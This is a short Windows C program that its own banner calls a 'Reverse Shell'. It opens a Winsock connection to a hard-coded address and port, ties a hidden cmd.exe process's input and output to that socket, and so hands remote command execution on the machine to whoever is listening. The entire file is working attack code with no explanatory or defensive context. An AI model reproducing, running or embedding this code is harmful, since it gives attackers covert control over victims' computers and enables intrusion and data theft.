#include <winsock2.h>
//#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32")

#define HOST "10.0.0.4"
#define PORT 2600

#define MOTD "############# Reverse Shell ################\n\n"

WSADATA wsdata;
SOCKET wsock;
SOCKET Sock;
struct sockaddr_in dest;
char ip_addr[16];
STARTUPINFO ini_process;
PROCESS_INFORMATION process_info;

int main(int argc, char *argv[]) {

    WSAStartup(0x0101, &wsdata);

    // Create socket file descriptor.
    //sock = socket(AF_INET, SOCK_STREAM, 0);

    wsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

    //if (argc != 3){fprintf(stderr, "Uso: <rhost> <rport>\n"); exit(1);}

    //## Include this if you want to look-up an IP by hostname (ie DNS)
    //struct hostent *host;
    //host = gethostbyname(argv[1]);
    //strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    // Populate dest with relevant data.
    dest.sin_family = AF_INET;  //AF = Address Family, INET = Internet
    dest.sin_addr.s_addr = inet_addr(HOST); //helps with Endianness
    dest.sin_port = htons(PORT); //helps with Endianness

    WSAConnect(wsock,(SOCKADDR*)&dest,sizeof(dest),NULL,NULL,NULL,NULL);

	//MOTD
	//send(sock, MOTD, strlen(MOTD),0);

    memset(&ini_process,0,sizeof(ini_process));
    ini_process.cb=sizeof(ini_process);
    ini_process.dwFlags=STARTF_USESTDHANDLES;
    ini_process.wShowWindow = SW_HIDE;
    //ini_process.CreateNoWindow = 1;
    ini_process.hStdInput = ini_process.hStdOutput = ini_process.hStdError = (HANDLE)wsock;
    
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&ini_process,&process_info);

}
